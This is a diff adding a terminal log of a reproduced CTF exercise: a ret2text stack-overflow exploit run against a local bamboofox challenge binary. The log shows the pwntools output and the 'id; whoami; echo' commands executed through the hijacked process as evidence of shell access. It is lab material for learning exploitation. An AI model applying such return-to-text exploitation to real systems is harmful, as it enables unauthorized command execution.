@@ -1,0 +1,17 @@
+复现实验终端记录 | ret2text
+命令：python3 ret2text_repro/exploit.py（交互阶段发送 id; whoami; echo RET2TEXT_EVIDENCE_OK）
+结果：通过（exit=0）
+
+[x] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text'
+[+] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text': pid 26339
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 33B
+[x] Receiving all data: 166B
+[x] Receiving all data: 170B
+[x] Receiving all data: 191B
+[+] Receiving all data: Done (191B)
+[*] Process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text' stopped with exit code -11 (SIGSEGV) (pid 26339)
+Maybe I will tell you next time !用户id=1000(xyx) 组id=1000(xyx) 组=1000(xyx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
+xyx
+RET2TEXT_EVIDENCE_OK
